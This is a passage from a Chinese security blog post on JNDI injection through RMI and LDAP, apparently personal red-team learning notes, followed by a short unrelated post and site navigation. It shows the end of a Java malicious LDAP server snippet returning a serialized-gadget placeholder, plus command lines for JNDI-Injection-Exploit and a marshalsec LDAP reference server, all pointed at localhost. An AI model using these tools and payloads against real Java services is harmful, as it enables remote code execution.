class="variable">cbstring</span> <span class="operator">=</span> <span class="built_in">this</span>.codebase.toString();</span><br><span class="line">            <span class="type">int</span> <span class="variable">refPos</span> <span class="operator">=</span> cbstring.indexOf(<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line">            <span class="keyword">if</span> ( refPos &gt; <span class="number">0</span> ) &#123;</span><br><span class="line">                cbstring = cbstring.substring(<span class="number">0</span>, refPos);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;Base64encode Gaget&quot;</span>));</span><br><span class="line"></span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>一个搬来的图 - 各版本的注入方法</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230412022117255.png" alt="image-20230412022117255"></p>
<h2 id="工具使用"><a href="#工具使用" class="headerlink" title="工具使用"></a>工具使用</h2><p>###<a target="_blank" rel="noopener" href="https://github.com/welk1n/JNDI-Injection-Exploit">JNDI-Injection-Exploit</a></p>
<p>该工具中没有实现ldap在8U191后的功能，应为涉及到了反序列化利用链。是不是可以尝试结合一下<code>ysoserial</code>魔改一下呢</p>
<p>jndi注入工具</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">-C 命令  -A IP</span><br><span class="line">java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C &quot;calc&quot; -A &quot;127.0.0.1&quot;</span><br></pre></td></tr></table></figure>

<p>提供了绕过<code>trustURLcodebae = false</code>的和<code>trustURLcodebae = ture</code>paylaod</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230410212856653.png" alt="image-20230410212856653"></p>
<p>###<a target="_blank" rel="noopener" href="https://github.com/mbechler/marshalsec">marshalsec</a></p>
<p>用于搭建rmi服务和ldap服务</p>
<p>使用方法:</p>
<p>在pom.xml文件路径下使用命令<code>mvn clean package -DskipTests</code>,打包项目，生成的<code>jar</code>报包在target目录下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#启动ldap服务</span><br><span class="line">E:\java_file\JNDI\src\main\java\com\example\jndi\LDAP</span><br><span class="line">java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1:8080/E:\java_file\JNDI\src\main\java\com\example\jndi\LDAP/#Exploit 8088</span><br></pre></td></tr></table></figure>



<p>注：看起来奇怪的代码：带有<code>$</code>符号的变量名字，就是普通变量没有特殊含义</p>
<p><img src="https://cdn.jsdelivr.net/gh/k4i-x3i0/pictures/images/image-20230408212306749.png" alt="image-20230408212306749"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$在java代码里面用做命名规范的话一般表示内部或临时变量。有些用idea反编译出来的代码也存在比如class$1这种看似毫不相关的变量，因为可能有编译优化，生成的字节码再逆向回来会稍有不同</span><br></pre></td></tr></table></figure>



<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
<li><a target="_blank" rel="noopener" href="https://evilpan.com/2021/12/13/jndi-injection/#normal-jndi">https://evilpan.com/2021/12/13/jndi-injection/#normal-jndi</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1611/#toc_jndi_rmi">https://tttang.com/archive/1611/#toc_jndi_rmi</a></li>
<li><a target="_blank" rel="noopener" href="https://tttang.com/archive/1405/">https://tttang.com/archive/1405/</a>  </li>
<li><a target="_blank" rel="noopener" href="https://www.cnblogs.com/yyhuni/p/15088134.html#%E4%BA%8C8u191%E4%B9%8B%E5%89%8D">https://www.cnblogs.com/yyhuni/p/15088134.html#%E4%BA%8C8u191%E4%B9%8B%E5%89%8D</a></li>
</ul>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/04/12/JNDI%E6%B3%A8%E5%85%A5-RMI%E4%B8%8ELDAP%E7%9A%84%E5%88%A9%E7%94%A8/" data-id="clgcm7rsw0000d8uq6rlmgdkf" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-新的开始" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2023/03/09/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/" class="article-date">
  <time datetime="2023-03-09T06:13:10.000Z" itemprop="datePublished">2023-03-09</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2023/03/09/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/">新的开始</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>​    去年搭的博客因为服务器到期没续费全没了，想想还挺可惜的。算了，重新开始！以后就更新一些笔记和wp，起码在学习路上留下点痕迹，给自己看！</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2023/03/09/%E6%96%B0%E7%9A%84%E5%BC%80%E5%A7%8B/" data-id="clezxe86o000094uq0llv598w" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  


</section>
        
          <aside id="sidebar">
  
    
  <div class="widget-wrap">
    <h3 class="widget-title">分类</h3>
    <div class="widget">
      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/RedTeam/">RedTeam</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签</h3>
    <div class="widget">
      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/RedTeam/" rel="tag">RedTeam</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">标签云</h3>
    <div class="widget tagcloud">
      <a href="/tags/RedTeam/" style="font-size: 10px;">RedTeam</a>
    </div>
  </div>

  
    
  <div class="widget-wrap">
    <h3 class="widget-title">归档</h3>
    <div class="widget">
      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">六月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">五月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">四月 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/03/">三月 2023</a></li></ul>
    </div>
  </div>


  
    
  <div class="widget-wrap">
    <h3 class="widget-title">最新文章</h3>
    <div class="widget">
      <ul>
        
          <li>
            <a href="/2023/06/21/Frp%E5%9F%BA%E6%93%8D/">Frp基操</a>
          </li>
        
          <li>
            <a href="/2023/06/20/CobaltStrike%E5%9F%BA%E6%93%8D/">CobaltStrike基操</a>
          </li>
        
          <li>
            <a href="/2023/05/03/2023-5-3-6-1%E5%88%B7%E9%A2%98%E6%97%A5%E8%AE%B0/">2023.5.3-6.1刷题日记</a>
          </li>
        
          <li>
            <a href="/2023/04/25/%E6%B8%97%E9%80%8F%E5%8F%96%E7%BB%8F-vulStack1/">渗透取经-vulStack1</a>
          </li>
        
          <li>
            <a href="/2023/04/17/fastjson%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90-1224-68/">fastjson漏洞分析-1224-68</a>
          </li>
        
      </ul>
    </div>
  </div>

  
</aside>
        
      </div>
      <footer id="footer">
  
  <div class="outer">
    <div id="footer-info" class="inner">
      &copy; 2023 k4i_x3i0<br>
      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
    </div>
  </div>
</footer>
    </div>
    <nav id="mobile-nav">
  
    <a href="/" class="mobile-nav-link">Home</a>
  
    <a href="/archives" class="mobile-nav-link">Archives</a>
  
</nav>
    

<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>


  
<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">

  
<script src="/fancybox/jquery.fancybox.pack.js"></script>




<script src="/js/script.js"></script>




  </div>
</body>
</html>